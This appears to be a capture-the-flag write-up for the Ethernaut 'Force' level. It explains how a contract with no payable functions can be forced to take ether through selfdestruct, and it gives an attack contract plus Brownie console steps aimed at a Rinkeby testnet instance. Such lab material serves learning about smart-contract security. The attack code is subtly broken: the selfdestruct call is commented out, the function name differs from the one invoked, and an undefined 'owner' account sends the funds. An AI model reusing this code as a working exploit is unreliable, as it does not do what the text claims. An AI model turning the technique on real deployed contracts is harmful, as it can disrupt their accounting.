## Exercise 7: Force

The vulnerable contract contains no code. The aim of the challenge is to force the contract to accept some ether. There are no payable functions in Force.sol that can accept ether through normal transfers. However, the EVM also has a `selfdestruct` opcode that takes an address as an argument. This address is the recipient for any ether held by a contract that is destroyed by calling `selfdestruct`. Therefore, by creating a contract, sending it some ether, then deliberately destroying it with the deployment address for `Force.sol` as the recipient, we can force the contract to accept ether.

### The vulnerable contract
```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

### The Hack

```javascript

pragma solidity ^0.6.0;

contract ForceHack{

    function receive() public payable returns (uint){
        // receive some ether and return the contract balance as a uint
        return address(this).balance;
    }

    function selfDestruct() public{

        // set address to the deployment addr for Force.sol
        address payable contract_address = 0x83867758a9A4D667c78fCE37b63483151114436D;
        //selfdestruct(contract_address);
    }


}
```

### Execution
NB Force.sol already has a deployment address provided via ethernaut "get instance"

```bash

>>> brownie console --network rinkeby    #start brownie session
>>> hacker = accounts.load('main')    # load account
>>> contract = Force.at('0x83867758a9A4D667c78fCE37b63483151114436D') # load vulnerable contract
>>> hack = ForceHack.deploy({'from': hacker})   # load hack contract
>>> hack.receive({'from':owner, 'value': 100000})   # send ether to hack contract
>>> hack.selfdestruct()    # self destruct hack contract with vulnerable contract as recipient
>>> web3.eth.getBalance(contract.address)   # check balance of vulnerable contract - should be >0

```

### Links
[Solidity by Example: selfdestruct](https://solidity-by-example.org/hacks/self-destruct/)
[StackExchange: why are selfdestructs useful?](https://ethereum.stackexchange.com/questions/315/why-are-selfdestructs-used-in-contract-programming/347)
